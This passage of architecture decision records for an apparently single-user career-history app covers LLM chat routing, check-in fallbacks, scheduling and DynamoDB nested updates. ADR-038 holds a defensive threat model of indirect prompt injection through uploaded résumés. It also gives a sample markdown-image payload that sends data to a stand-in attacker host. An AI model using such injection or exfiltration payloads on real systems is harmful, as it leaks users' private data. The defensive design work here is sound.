elsewhere), and any workload that can exceed it belongs behind an async job with its own status
resource.

---

## ADR-038: Chat routing — a third control-flow tool (`answer_question`) keeps `toolChoice=any`

**Status:** Accepted
**Date:** 2026-07-28 (slice 7)

### Context
Through slice 2b, `chat_lambda` is ingestion-only: §3.1.2's **two-tool pattern** hands Haiku exactly
`propose_entry` and `ask_clarification` with `toolChoice=any`, so every turn is *forced* to produce
structured output. FR-6.1 now asks the same endpoint to also answer questions over the user's own
history ("what did I do in 2025?", "which entries mention Python?").

That exposes a gap in the current design rather than a new feature bolted beside it: **today a
question has no tool that fits it.** Forced to call something, Haiku must bend the question into
`ask_clarification` (mildly wrong) or, worse, `propose_entry` (creates a candidate entry out of a
question). The exit criterion "a question can't accidentally create an entry" is therefore not a
constraint the new path must avoid violating — it's a defect in the *existing* path that routing
fixes.

The second forcing constraint is that **an answer requires retrieval, and retrieval requires a
vector**. The model cannot answer from history it has never seen, and the Lambda cannot know which
entries are relevant until it has a query to embed. So any design has to get from "user text" to
"query embedded, entries ranked, answer composed" — the only question is who owns which step.

### Decision
Add a **third tool, `answer_question`**, and keep `toolChoice=any` unchanged. The tool is
**control-flow only** — it has no action of its own; it exists so the model can *signal* "this turn
is a question" and hand back a retrieval query in a typed way. This is the same "tool use as a phase
signal" pattern the resume agent already uses for `retrieval_done` / `submit_resume` /
`submit_critique` (§3.2, and the note at §3.1's close).

A Q&A turn is then **two Bedrock calls with deterministic retrieval bolted between them**, all owned
by the Lambda:

1. **Route (Haiku, `toolChoice=any`).** Same history replay, same forced-tool invariant. The model
   picks `propose_entry` / `ask_clarification` (existing paths, unchanged, still one call) or
   `answer_question`, whose input carries the retrieval query — the user's intent restated for
   embedding, not their raw text.
2. **Retrieve (no model).** Titan-embed the query (`bedrock_client.embed`), read the user's entries,
   rank with `similarity.rank_by_similarity`, take top-k. Pure Python + one embedding call; no loop,
   no model discretion, so the cost is fixed and the behaviour is testable without Bedrock.
3. **Synthesize (Haiku).** Compose a grounded answer with the top-k entries in the prompt, under
   instructions to answer *only* from them and to say so when the history doesn't cover the question.

**IAM — and a correction found while implementing this.** The plan for this slice, and the first
draft of this ADR, both said `chat_lambda` would *gain* `dynamodb:Query` on `ENTRY#` items. **It
does not, because it already had it.** The function's existing policy grants `dynamodb:Query` on
the table ARN with no condition, so reading `ENTRY#` items was already permitted by IAM through all
of slices 2–6; nothing in the role changed this slice.

That is not sloppiness in the original policy — **IAM cannot express the restriction.** Every item
for a user shares one partition key (`USER#<sub>`), the isolation wanted is by *sort-key prefix*,
and `dynamodb:LeadingKeys` scopes the partition key only with no sort-key-prefix equivalent
(§4.2.1, and the same limitation §4.2.4 already documents for write-time key constraints). So
§4.2.3's pre-slice-7 claim that chat "can only touch `CONVO#`" was always **an application-code
property, not an IAM one** — enforced by which `ddb_helpers` functions the handler calls.

The honest restatement, therefore:

- **What actually changes in IAM:** one grant, `bedrock:InvokeModel` on the Titan embed model, so
  the retrieval query can be vectorised. That is the entire policy delta.
- **What changes in code:** `chat_lambda` now calls `query_entries` where before it called only
  `query_conversation`. The read widening is a *code* change that IAM was never blocking.
- **What is unchanged:** chat still cannot write an entry. `PutItem` is granted, but the handler
  only ever writes `CONVO#` items through `put_conversation_message`, and entry creation remains
  `career_crud`'s exclusive privilege behind the user's confirm (§3.1.3). That is the property
  §4.2.3 actually protects, and it survives intact.

Stated plainly for the record: after this slice a successful prompt injection in chat can cause the
user's career history to be *read* into a model prompt. Single-tenant MVP, PK scoped to the JWT
`sub` (§4.2.4), so the blast radius is the user's own data in the user's own session.

The lesson worth carrying is the one the correction exposes: **a "least privilege" boundary that
IAM cannot express is a code invariant wearing an IAM costume.** It is still worth having — but it
must be documented as a code invariant, tested as one, and never assumed to be enforced by the
platform. §4.2.3 is amended in this slice **before** the code, since a security review reading a
stale isolation claim is worse than no claim at all.

#### Injection controls (why the widening is an acceptable trade)

The threat here is not "an attacker reads the user's entries" — in a single-tenant app the user
reading their own history *is the feature*. It is **indirect prompt injection**: slice 5 lets a
résumé be uploaded from anywhere, its text becomes an entry's `content`, and slice 7 then retrieves
that content into a model prompt. Poisoned data at rest, replayed into a privileged context. The
question worth engineering against is therefore *"can retrieved content act as instructions?"*

Four controls, all of which hold at the API layer rather than by asking the model nicely:

1. **Retrieval is model-free.** The model emits a query *string*; the Lambda owns embedding,
   ranking and the top-k slice. A fully hijacked model cannot say "retrieve everything" or "retrieve
   the ones mentioning salary." This is the concrete security dividend of rejecting the
   `search_entries` agentic loop — the alternative would have handed query control to the model.
2. **The synthesis call carries no tools.** `bedrock_client.converse` omits `toolConfig` from the
   request entirely when `tool_config is None`, so the single call that sees entry content has no
   tool it could be induced to invoke. Injected text of the form *"now call `propose_entry` with…"*
   has nothing to reach. This closes injection→write at the transport, not by prompt.
3. **Privilege separation between the two calls.** The routing call has tools but never sees entry
   content; the synthesis call sees entry content but has zero capability, and its output is only
   ever rendered as text. Untrusted-at-rest data reaches only the powerless call. (This is the
   dual-LLM shape; it falls out of the two-call design rather than being bolted on.)
4. **Answers render as text, never HTML or markdown.** A real exfiltration channel, not a
   hypothetical: a markdown-rendered answer could emit `![](https://attacker/?d=…)` and leak on
   image load. `Chat.tsx` today uses plain React text nodes — no `dangerouslySetInnerHTML`, no
   markdown renderer anywhere in `frontend/src` — so this is currently true *by construction*.
   Slice 7 makes it an explicit tested invariant, because "add react-markdown for nicer answers" is
   a highly plausible future commit that would silently reopen it.

Delimiting retrieved entries and instructing the model to treat them as data is *also* done, but it
is recorded here as **defense in depth, not a boundary**. Prompt instructions are a nudge; nothing
in this design depends on the model obeying them.

#### Aggregate questions — a known, bounded limitation

Semantic top-k answers *"what is most like this query?"* — a ranking question. **"How many AWS certs
do I have?" is a filter-and-count question**, and embeddings are the wrong index for it. The failure
is worse than vagueness: hand the model the 5 nearest entries and it will confidently answer "5."
Top-k structurally biases a count toward k, so the wrong answer is *predictable and confident*.

The useful observation is that this is a **compression choice, not a retrieval ceiling**:
`ddb_helpers.query_entries` already reads the *entire* corpus into Lambda memory (paginated to
completion — the §2.5 AP-10 note) before anything is ranked. The whole history is in hand; top-k is
a narrowing we elect. So slice 7 takes two cheap steps and defers the third:

- **Now — corpus census.** Every synthesis prompt carries counts by `entry_type`, computed in Python
  from the corpus already loaded (~8 integers, ~50 tokens). This answers "how many certs do I have?"
  correctly *today* without a filter branch, and it embodies the right principle: **let Python
  count, let the model narrate.** LLMs are unreliable counters; hand over the number, not the task.
- **Now — reserved `intent` field** (`lookup` | `aggregate`) on `answer_question`'s input. Slice 7
  implements only the `lookup` branch. Shipping the field unused makes the v1.1 filter path additive
  rather than a tool-schema change plus reasoning about conversation turns already persisted under
  the old shape.
- **v1.1 — hybrid retrieval.** A structured-filter branch (`entry_type`, issuer keyword, date range)
  evaluated deterministically over the in-memory corpus, returning a compact projection (title /
  date / issuer, no `content`, no embedding) instead of top-k full entries. This is text-to-*filter*
  alongside text-to-vector — the standard hybrid-retrieval answer.

Note what this does *not* require: **no GSI, and ADR-028's "no GSIs at MVP" holds comfortably.** A
single human career is tens to low hundreds of items — one cheap Query. A `entry_type` GSI would
only earn its keep at a corpus size this application does not reach.

### Alternatives considered
- **`toolChoice=auto`, free text allowed for answers.** The obvious simplification: let the model
  just *talk* when it isn't ingesting. Rejected on two counts. First, the answer would be
  **ungrounded** — with no retrieval step the model answers from the conversation and its own
  priors, which is precisely the hallucination FR-6.1 exists to avoid; grounding it would mean
  pre-retrieving on *every* turn, paying Titan + prompt tokens on ingestion turns that never need
  it. Second, `auto` **surrenders the forced-structured-output guarantee that slice 2b's ingestion
  depends on** — the model becomes free to reply chattily where it used to call `propose_entry`,
  which is exactly the class of run-to-run drift already observed on this account (Haiku Converse at
  `temperature=0` is not deterministic). Trading a known-good ingestion path for routing convenience
  is a bad trade.
- **A `search_entries` tool + a real agentic loop (`toolChoice=auto`, `toolResult` round-trips).**
  The most conventionally "agentic" shape, and tempting given ADR-010's own-the-loop learning goal.
  Rejected for slice 7: it makes cost a function of model discretion (the resume agent's growing
  retrieval context is already backlog B-004, the dominant per-run cost), and it **breaks history
  replay** — `_to_converse_messages` deliberately flattens a tool-calling assistant turn to its text
  summary precisely because Converse requires every `toolUse` be paired with a matching
  `toolResult`, which this single-shot design never produces. Adopting it means reworking
  conversation persistence, not just routing. The agentic-loop learning is already banked in slice
  6a where the workload justifies it.
- **A separate `POST /chat/ask` endpoint.** Clean separation, but it pushes routing onto the *user*
  ("am I logging or asking?"), which is the opposite of the conversational promise, and it
  duplicates history handling across two routes.

### Consequences
- ✅ Ingestion is untouched — same tools, same `toolChoice`, same single call, so 2b's smoke tests
  are a genuine regression check rather than a rewritten baseline.
- ✅ Fixes the latent "a question gets parsed into an entry" defect by giving the model a correct
  destination for questions.
- ✅ Retrieval is deterministic and model-free, so it unit-tests without Bedrock and its cost is a
  constant (one Titan embed) rather than a function of how many times the model chooses to search.
- ✅ Bounded cost: a Q&A turn is **at most two Haiku calls**; ingestion stays at one.
- ⚠️ Two calls means Q&A latency is roughly double a parse turn. Both are Haiku and small, so this
  is comfortably inside a chat interaction — but it is the reason to keep top-k modest.
- ✅ Injection→write is closed at the transport (no `toolConfig` on the call that sees entry
  content), not by prompt instruction — a boundary that survives a fully compromised model.
- ⚠️ Answer quality is bounded by retrieval quality. Top-k semantic ranking is the wrong index for
  aggregate-shaped questions; the corpus census covers the common counting case, and the hybrid
  filter branch is deferred to v1.1 (see above). The honest fallback remains the "history doesn't
  cover this" instruction.
- ⚠️ `chat_lambda` can now read entries (above). The §4.2.3 isolation claim must be amended, not
  quietly outgrown.

### Cross-cloud parallel
"Forced function call as a router" is portable: Azure OpenAI's `tool_choice: "required"` and Vertex
AI Gemini's function-calling mode `ANY` have near-identical semantics (as §3.1.2 already noted for
the two-tool pattern). The deeper portable idea is **classify-then-retrieve-then-generate** — a
router turn that emits a typed intent, deterministic retrieval owned by the application, and a
generation turn grounded in what was retrieved. That is the standard RAG shape everywhere; what
varies is only whether the router is a forced tool call, a classifier model, or a rules layer.

---

## ADR-021: Check-in fallback tiers — three tiers, and a budget guard that is structural, not measured

**Status:** Accepted
**Date:** 2026-07-28 (slice 8)

### Context
FR-4.5: *"If LLM personalization fails **or exceeds cost budget**, the system shall fall back to a
generic reminder."* Architecture §3.3.6 answers only half of that. It defines a `mode` flag —
`"personalized"` when the recent-entry query returns rows, `"generic"` when it returns none — and
says the same `compose_checkin` tool schema serves both. That is a **content** decision: what to
write about when there is nothing to write about.

FR-4.5 is asking something else. "Personalization *fails*" is not "the user had a quiet week" — it
is Bedrock throttling, returning malformed tool input twice, or timing out. In that state there is
no LLM output *at all*, so switching the `mode` flag is meaningless: both modes call Haiku. §3.3.6's
generic mode cannot be the fallback for a failure of the thing it depends on.

And "exceeds cost budget" has no mechanism anywhere in the architecture. §3.3.7 lists cost *scaling
levers* for a hypothetical multi-tenant future; nothing defines a budget that a single run could
exceed, or what checking one would even mean at the moment of send.

### Decision
**Three tiers, keyed on two independent conditions**, rather than §3.3.6's single `mode` flag:

| Tier | Trigger | Composition | LLM? |
|---|---|---|---|
| 1 — **personalized** | Recent-entry window returned rows | Haiku, entries in prompt | yes |
| 2 — **generic** | Window empty, profile has an aspirational goal | Haiku, goal in prompt, no entries | yes |
| 3 — **static** | Bedrock failed after retries, *or* the profile is too sparse for tier 2 to say anything | Jinja2 template only, no model call | **no** |

Tiers 1 and 2 are §3.3.6's existing `mode` flag, unchanged. **Tier 3 is the FR-4.5 fallback proper**
— the one that survives Bedrock being unavailable, because it never calls it. A static nudge in the
inbox beats silence: the check-in's job is to prompt a habit, and a plain "anything worth logging
this week?" still does that. **Failing to send is a worse outcome than sending something
unpersonalized**, so tier 3 sends rather than aborts.

**The budget guard is structural, not measured.** We do *not* meter spend at send time and branch on
a dollar threshold. Two reasons that would be theatre: a Cost Explorer read is hours stale, and the
per-run cost is known in advance to be ~$0.0002 — three orders of magnitude below anything worth
guarding. Instead the prompt is **bounded by construction** so there is no runtime state in which a
run *could* exceed budget:

- The recent-entry window is capped at **15 entries**, most-recent-first, regardless of how many the
  date window returns.
- Each entry is truncated to a **fixed character budget** before it enters the prompt.
- The Haiku call carries a small `max_tokens`, since the output is a short structured email.

FR-4.5's "exceeds cost budget" is therefore satisfied by making the overrun **unreachable** rather
than by detecting it. This is the same reasoning ADR-036 applied to the resume agent from the other
end: there, per-run cost is genuinely material (~$0.31) and warrants a real measured token ceiling;
here it is not, and a measured guard would be more moving parts than the risk justifies. *Cap the
input, not the invoice.*

**A missing field this forced.** §3.3.6 and the slice-8 plan both say tier 2 references "the
profile's `aspirational_goal`". **That field does not exist** on the `Profile` model — the same
class of gap as B-008, where `_contact_from_profile` read `name`/`location` that had never been
added. Slice 8 adds `aspirational_goal` to `Profile` and `ProfileUpdate` and surfaces it on the
settings form; without it, tier 2 degrades to tier 3 for every user, permanently and silently.

### Alternatives considered
- **Two tiers, treating §3.3.6's generic mode as the FR-4.5 fallback.** The literal reading of the
  architecture doc. Rejected because it does not survive the failure it claims to handle: generic
  mode calls Haiku, so a Bedrock outage takes out both tiers and the user gets nothing.
- **Abort the send on LLM failure.** Defensible — an unpersonalized email is lower value, and a
  missed one is invisible. Rejected because it makes the *habit loop* — the actual product — depend
  on Bedrock availability, for a feature whose value is the reminder itself.
- **Measured budget check before the call.** Read month-to-date spend, skip personalization above a
  threshold. Rejected: Cost Explorer lags by hours, per-run cost is ~$0.0002, and it adds an IAM
  grant and a failure mode to guard against a rounding error.
- **Static template for everything (no LLM at all).** Cheapest, and honestly not far off in value
  for a sparse profile. Rejected because ADR-011 already weighed this — personalization is what
  makes check-ins motivating rather than nagging.

### Consequences
- ✅ FR-4.5 is satisfied against the failure it actually names, not a proxy for it.
- ✅ Tier 3 needs no Bedrock, so the check-in path has no hard dependency on Bedrock availability.
- ✅ No runtime budget logic to maintain, and no spend-metering IAM grant on `checkin_lambda`.
- ✅ Tier 3 is trivially testable — no Bedrock mock required to exercise the fallback.
- ⚠️ Tier 3 quality is materially lower, and the email still *arrives* — so a permanent slide into
  it is invisible from the inbox. It is therefore instrumented: a dedicated `CheckinsStaticFallback`
  metric, nonzero only when personalization failed. *(This ADR first specified the tier as a
  dimension on `CheckinsSent`. Powertools scopes dimensions to the whole invocation rather than to
  one metric, so setting it inside the per-user loop would relabel every metric the run emits;
  a separate counter carries the same signal without that coupling.)*
- ⚠️ The 15-entry cap means a genuinely prolific fortnight is summarized from a subset. Acceptable:
  the email is a nudge, not a report.

### Addendum — what actually triggers tier 3 (found on the first live run)

The tier-3 trigger above is stated as "Bedrock failed after retries". The first live personalized
send exposed a more common failure that the original design handled *too aggressively*: Haiku
returned a complete, well-written email but **omitted `sign_off`**, a field the `compose_checkin`
tool schema lists as `required`. Converse treats `required` as a strong hint rather than a
constraint, and this project has already recorded that Haiku varies run-to-run even at temperature
0 — the generic send a minute earlier had included the field. Pydantic rejected the response, and a
perfectly good email was discarded in favour of the static template.

The fix is a split in how strictly fields are validated, not a looser schema:

- **`subject` and `prompts` stay required.** Without a subject there is no email; without prompts
  there is no *check-in*, only a greeting. A response missing either is genuinely unusable and tier
  3 is the right answer.
- **`greeting` and `sign_off` default.** They are framing, not content.

Generalised: **validate what makes the output useful; default what merely makes it polished.** A
schema that is strict about cosmetics converts recoverable model variance into a visible downgrade —
and because the email still arrives, the downgrade is invisible without the
`CheckinsStaticFallback` metric. Structured-output flows over a non-deterministic model should
prefer salvage over rejection wherever the missing piece is not load-bearing.

### Cross-cloud parallel
The portable idea is **graceful degradation across capability tiers**, with the lowest tier having
no dependency on the thing that fails. Azure Functions with a Durable Functions fallback activity,
or GCP Cloud Functions with a static Firestore-templated path, express the same shape. The broader
principle is provider-independent: *the last tier of a fallback chain must not depend on any service
that the tiers above it depend on* — otherwise it is not a fallback, it is a retry.

---

## ADR-039: Check-in scheduling — one daily UTC fire paced by `next_checkin_at`, due-users found by Scan

**Status:** Accepted
**Date:** 2026-07-28 (slice 8)

### Context
FR-4.1 requires a configurable cadence (weekly / bi-weekly / monthly / quarterly) and FR-4.2 sets
weekly as the default. Architecture §3.3.3 sketches the mechanism: one EventBridge Scheduler entry
fires daily, and the Lambda "queries PROFILE items where `next_checkin_at <= now`" to decide who is
due.

Two things checked against the live account at slice start make that sketch not implementable as
written:

1. **There is no index that supports that query.** ADR-028 ships no GSIs. `next_checkin_at` is a
   plain attribute, and PROFILE rows for different users live under different partition keys, so
   there is no key expression that reaches "all PROFILEs, filtered by a timestamp." §3.3.3 says
   "queries" and defers a GSI to multi-tenant — but the operation it describes is not a degraded
   Query, it is a **Scan**. §3.3.3 is corrected in this slice.
2. **`checkin_time_local` does not exist.** §3.3.3's multi-tenant note claims "PROFILE has
   `checkin_cadence` and `checkin_time_local` attributes already." The `Settings` model has
   `checkin_cadence`, `checkin_paused`, `preferred_template_id` — **no `checkin_time_local`**, and
   the live dev PROFILE has no `settings` attribute at all.

### Decision
**Keep the daily-fire shape; make the lookup honest; ship no time-zone handling at MVP.**

**Schedule.** A single EventBridge Scheduler entry fires **daily at 23:00 UTC**, with 3 retries,
1-hour maximum event age, and an SQS DLQ (§4.5.2). The *fire* is daily; the *cadence* is paced
entirely by `next_checkin_at` on the PROFILE. This is what lets all four FR-4.1 cadences work
without ever touching infrastructure — a cadence change is a DynamoDB write, not a schedule update.
Per ADR-030's reserved-concurrency posture, `checkin_lambda` gets a cap of 1: exactly one invocation
should ever be in flight.

**Send window: Friday ~4pm PT.** 23:00 UTC is 16:00 PDT. The check-in asks a looking-back question
("what did you get done?"), so it belongs at the end of the week, while the week is still legible —
not in Monday-morning planning mode.

**Due-user discovery is a `Scan` with `FilterExpression SK = PROFILE`**, then an in-Python filter on
`next_checkin_at <= now` and `checkin_paused is not True`. Measured at slice start: 48 items scanned
to find 1 PROFILE, ~1 RCU, once a day. The Scan is isolated behind a single `ddb_helpers` function
so the multi-tenant swap is a change of one implementation, not of the surrounding flow.

**No per-user time zones, and the DST drift is accepted, not overlooked.** A fixed UTC hour means
the send lands at 16:00 PDT in summer and **15:00 PST in winter** — the email silently moves an hour
earlier each November. For a single user this is a non-event. It is recorded here because the
failure mode of *not* recording it is someone rediscovering the drift in six months and treating a
known trade-off as a bug. `checkin_time_local` is **not** added; a field that nothing reads is worse
than an absent one, because it implies a capability that does not exist.

**Absent state reads as due.** The live PROFILE has no `settings` block, no `next_checkin_at`, and
no `last_checkin_sent_at` — so "fields missing" is not an edge case to defend against, it is the
only state that currently exists. Missing settings default to weekly/unpaused; a missing
`next_checkin_at` reads as **due now**, seeding the cycle on first run rather than requiring a
migration.

Idempotency is unchanged from §3.3.4: the conditional `UpdateItem` claiming the send slot with a
6-hour buffer, which is what makes Scheduler's at-least-once delivery safe.

### Alternatives considered
- **A weekly cron matching the cadence directly** (`cron(0 23 ? * FRI *)`). Simpler — no
  `next_checkin_at` arithmetic, no due-check. Rejected because it hard-codes *one* cadence into
  infrastructure: honoring FR-4.1's other three would mean either four schedules or mutating the
  schedule on every settings change, turning a DynamoDB write into a control-plane call that can
  fail independently of it.
- **Per-user Scheduler entries created at signup** (§3.3.3's own multi-tenant suggestion). Correct
  at scale and avoids the Scan entirely. Rejected at MVP: it puts schedule lifecycle management —
  create, update on cadence change, delete on account removal — into the app for one user, and every
  settings write becomes a distributed transaction across DynamoDB and Scheduler.
- **A GSI on `next_checkin_at`.** Makes §3.3.3's wording literally true. Rejected: reversing ADR-028
  for a once-daily read of a single-digit item count, and paying GSI write amplification on every
  PROFILE update, to avoid a ~1 RCU Scan.
- **Hard-code the single user.** Cheapest. Rejected because it bakes single-tenancy into the flow
  ADR-006/007 explicitly kept multi-tenant-ready — it would need rewriting, not extending.
- **Store the user's IANA time zone and compute local send times.** The right long-term answer.
  Deferred: it only pays off with users in more than one time zone, and it would need the per-user
  schedule model above to be genuinely useful.

### Consequences
- ✅ All four FR-4.1 cadences work with one schedule; cadence changes are pure data writes.
- ✅ The Scan→GSI-Query swap is a one-function change, behind a helper.
- ✅ No migration needed for the existing PROFILE — absent fields seed themselves on first run.
- ✅ The failure surface stays small: one schedule, one DLQ, one alarm.
- ⚠️ Scan cost grows linearly with total item count — *all* items, not just PROFILEs, since the
  filter applies after the read. Fine at 48 items; it is the first thing to revisit at multi-tenant,
  and it is the trigger for the GSI that ADR-028 deferred.
- ⚠️ Send time drifts one hour across DST boundaries. Accepted and documented above.
- ⚠️ `next_checkin_at` is now load-bearing state with no UI. If it is ever written wrong, the symptom
  is a silently missing email — hence the CHECKINLOG audit item and the `CheckinsNoDueUsers`
  metric, which distinguish "nothing to do" from "broken."
- ⚠️ **A failed send still consumes the cycle.** The slot claim writes `last_checkin_sent_at` and
  `next_checkin_at` *before* SES is called (§3.3.4), so an SES failure after the claim leaves the
  user marked as sent and the next nudge a full cadence away. This is not an oversight in the
  ordering — it is the ordering's price. Claiming *after* the send would make a Scheduler retry
  deliver a duplicate; claiming *before* makes a transient failure skip a cycle. **Idempotency buys
  "at most once" by giving up "at least once", and no ordering yields both.** For a nudge the trade
  is right — a missed reminder is a non-event, a duplicate is an irritation — but the reverse
  choice would be correct for, say, a billing notice, and the reasoning should be re-derived rather
  than inherited if this pattern is copied.
- ⚠️ Cadence changes take effect from the *next* send, not immediately: `next_checkin_at` is only
  rewritten when a check-in goes out, so a weekly→monthly switch still honours the already-scheduled
  send and starts spacing at 30 days after it. Surfaced in the settings UI rather than fixed, since
  recomputing on write would let a cadence change repeatedly postpone a due check-in.

### Cross-cloud parallel
The pattern — **a frequent fixed trigger plus a due-timestamp in the datastore**, rather than a
trigger per schedule — is how most job schedulers are built once cadence becomes user-configurable.
Azure Functions Timer trigger + a due column, or GCP Cloud Scheduler + a Firestore `nextRunAt`, are
the same design. The trade is identical everywhere: you exchange precise per-entity timing for a
system where changing a schedule is a data write instead of a control-plane operation, and control
plane operations are the ones that fail in ways your transaction cannot roll back.

---

## ADR-040: Nested `settings` updates — dotted-path `SET`, one path per sub-field

**Status:** Accepted
**Date:** 2026-07-28 (slice 8)

### Context
FR-4.6 requires cadence and pause to be changeable from settings. Both live inside the nested
`settings` object on the PROFILE item (§2.8), and they must move **independently** — pausing must not
reset the cadence, and changing the cadence must not un-pause.

`PUT /settings` shipped early, with B-008. Its `ProfileUpdate` model **deliberately omits `settings`**
and says why in a docstring: DynamoDB's partial-update semantics are per *top-level attribute*, and
`update_profile` compiles one `SET #f<n> = :v<n>` clause per key it is handed. So
`{"settings": {"checkin_paused": true}}` would compile to `SET settings = {"checkin_paused": true}` —
**replacing the whole object and silently dropping `checkin_cadence`**. The field was withheld rather
than shipped with that behavior, and logged as **B-014** for its first real consumer. This slice is
that consumer.

The trap deserves naming precisely, because it does not look like a bug at the call site: the write
succeeds, returns 200, and the response body — read back from `ReturnValues: ALL_NEW` — accurately
shows a `settings` object with one field in it. Nothing surfaces the loss except the *next* check-in
running at the wrong cadence, days later.

### Decision
Accept `settings` on `ProfileUpdate` as a model with **all-optional sub-fields**, and compile it to
**one dotted `SET settings.#sub = :val` path per supplied sub-field**:

```
SET settings.#s0 = :sv0, settings.#s1 = :sv1, #updated_at = :updated_at, ...
```

DynamoDB applies document-path updates surgically: sibling attributes inside `settings` are
untouched, so cadence and pause are genuinely independent. Sub-fields absent from the request are
never named in the expression and therefore cannot be affected.

Two details that make it correct rather than merely working:

- **`settings` must exist before a dotted path can be written into it, and seeding it needs its own
  `UpdateItem` call.** A write of `settings.checkin_paused` into an item with no `settings`
  attribute fails with `ValidationException: The document path provided in the update expression is
  invalid for update` — which is the state of the live PROFILE today, so **every** settings write
  would fail without a seed. The obvious fix, prefixing
  `SET settings = if_not_exists(settings, :empty_map)` onto the same expression, **does not work**:
  DynamoDB rejects an expression that touches both a path and its own descendant with
  `Two document paths overlap with each other`. So `update_profile` issues a **separate seeding
  `UpdateItem`** first, and only when the payload actually carries settings sub-fields. The seed is
  idempotent (`if_not_exists` leaves a populated object alone) and creates nothing but an empty map,
  so it is safe to repeat and cannot lose data if the second call never happens.
- **`exclude_unset` must be applied to the nested model too**, not just the top level. A plain
  `model_dump()` on the nested model materializes Pydantic defaults, so a request touching only
  `checkin_paused` would emit `checkin_cadence: "weekly"` and quietly overwrite a user's monthly
  setting — the original bug, reintroduced one level down and harder to see.

> **All four premises above were probed against the live `CareerVaultTable-dev` before this ADR was
> settled**, using a throwaway PROFILE item: the dotted-path-into-absent-attribute failure, the
> overlapping-paths rejection, the seed's idempotency, and — the property FR-4.6 actually needs —
> that writing `settings.checkin_cadence` leaves `settings.checkin_paused` intact. The
> single-expression form was in this ADR's first draft as fact and was wrong; it survived exactly
> as long as it took to run it.

### Alternatives considered
- **Read-modify-write** — `GetItem`, merge in Python, `PutItem` the whole item. Simple and obvious.
  Rejected on two counts: it opens a lost-update race between concurrent writers (needing a version
  attribute and a conditional write to close, which is more machinery than the dotted path), and a
  full `PutItem` would clobber attributes the API layer does not model — exactly what
  `update_profile`'s docstring already rejected for the top level.
- **Flatten settings to top-level attributes** (`checkin_cadence` beside `name`, no nesting).
  Sidesteps the problem entirely and is arguably the better original design. Rejected as a data
  migration on a shipped item shape, for cosmetics — and §2.8 documents the nested shape as the
  contract.
- **Separate `PUT /settings/checkin` route.** Avoids nesting in the payload but not in storage — the
  same dotted-path write is still required underneath, plus a route.
- **Ship `settings` replace-whole-object and document it.** Rejected: FR-4.6 needs exactly the two
  independent controls this would break, so the first feature to use it would be the one it breaks.

### Consequences
- ✅ Closes B-014 at the layer where the trap lives, not at the call site.
- ✅ Cadence and pause move independently — tested per sub-field, which is the test that would have
  caught the original behavior.
- ✅ No read before write, still create-or-update, and no lost-update race — the property that
  motivated rejecting read-modify-write survives the two-call shape, because the extra call is a
  blind idempotent seed rather than a read.
- ✅ Generalizes to any future nested attribute on the PROFILE.
- ⚠️ `update_profile` now has two code paths (top-level and nested) and is correspondingly harder to
  read. The nesting is one level deep only; arbitrary-depth merging is explicitly not built.
- ⚠️ A settings write costs **two** `UpdateItem` calls, not one, and they are not atomic together.
  The failure window is harmless in both directions: seed-then-crash leaves an empty `settings`
  object that the next write fills, and the seed cannot destroy anything. Worth stating rather than
  discovering — "partial update" now has a second, coarser meaning on this path.
- ⚠️ An unknown sub-field in a request body is rejected by `extra="forbid"` on the nested model, not
  silently stored. Intentional — same reasoning as the top-level model.

### Cross-cloud parallel
Document-path updates are near-universal in document stores: MongoDB's `$set: {"settings.paused":
true}` and Firestore's `update({"settings.paused": true})` with dotted field paths are the same
operation, including the same gotcha that a nested-object *assignment* replaces rather than merges
(Firestore's `set(..., {merge: true})` exists precisely for this). The transferable instinct: **in
document stores, "update" defaults to replace at whatever level you name** — merging is something you
opt into, and the failure is silent data loss rather than an error.

---

## ADR-041: MVP delivery posture — dev *is* the MVP, prod proven by dry run

**Status:** Accepted
**Date:** 2026-07-28 (slice 9)

### Context
The plan doc has carried an open ⚠ since slice 9 was written: deploy a real prod stack, or declare
the dev stack the MVP? The framing assumed cost was the tie-breaker. Measured against the live bill,
**it is not.** July month-to-date:

| Service | MTD |
|---|---|
| Claude Sonnet 4.6 (resume agent) | $2.88 |
| Claude Haiku 4.5 | $0.16 |
| S3 + DynamoDB + API Gateway + CloudWatch + SNS + SQS + Cognito + CloudFront | **< $0.01 combined** |

**82% of the bill is one Lambda's model calls, and the entire deployed infrastructure costs less
than a penny a month.** A second stack sitting idle would not move the needle — the $5 ceiling is a
constraint on *Bedrock usage*, not on how many environments exist. Any argument for or against prod
has to be made on other grounds, which is the opposite of what the plan doc assumed.

The real costs of a prod stack are operational, and two of them are not automatable:

- A second Cognito user pool means a second user identity and a second login to maintain.
- A second SES identity requires a **manual verification link click** — CloudFormation cannot
  complete it (established in slice 8). Prod would deploy into a half-working state until a human
  opened an inbox.
- Two stacks drift. Every future slice pays a sync tax on a single-user application where nobody but
  Oche will ever sign in.

Against that sits one genuine gap: the template's billing alarms are **prod-gated** (§4.1.4), so that
branch of the template has **never been evaluated by CloudFormation**. It would first execute on the
day it is actually needed, which is the worst possible time to discover a typo in a conditional.

### Decision
**Declare the dev stack the MVP.** It is the stack Oche uses; a "promotion" to prod would produce a
second copy of an application with one user, not a more real one.

Separately, **prove the prod path without deploying it**: run
`sam deploy --config-env prod --no-execute-changeset` and inspect the generated change set. This
evaluates every prod-gated conditional — the billing alarms above all — and fails on template errors
without creating a single resource or incurring a cent. Record what the change set *would* create,
and what remains manual (SES identity verification, Cognito user creation), as the documented
prod-readiness gap.

The distinction being drawn: **a dry run tests the template; a deployment tests the operations.**
Only the first is in doubt, so only the first is worth buying.

### Consequences
- ✅ The one genuinely unverified branch of the template gets exercised, at zero cost and zero
  resources.
- ✅ No second Cognito pool, no second SES verification, no drift tax on future slices.
- ✅ Reframes the $5 ceiling correctly for every future decision: it governs **Bedrock call volume**,
  not environment count. Deploying more infrastructure is nearly free; calling Sonnet is not.
- ⚠️ "MVP" now names a stack called `careervault-dev`. The name is misleading to anyone who joins
  later and must be stated plainly in the README rather than left to be inferred.
- ⚠️ The dry run proves the template *synthesizes and diffs*; it does not prove the resources would
  reach `CREATE_COMPLETE`. IAM propagation, service quotas, and cross-resource ordering are still
  untested. This is a narrower guarantee than a deploy and is claimed as such.
- ⚠️ If CareerVault ever takes a second user, this decision reverses and prod becomes required —
  the reasoning above is explicitly contingent on single-user (ADR-006/-007).

### Dry-run result (2026-07-29) — it found a real blocker

The dry run was justified on the billing alarms and paid for itself on something else entirely.

**First attempt failed outright**, before producing a change set:

```
Waiter ChangeSetCreateComplete failed ... Status: FAILED.
Reason: The following hook(s)/validation failed: [AWS::EarlyValidation::ResourceExistenceCheck]
```

Neither `describe-stack-events` nor `describe-change-set-hooks` returned any detail — the events
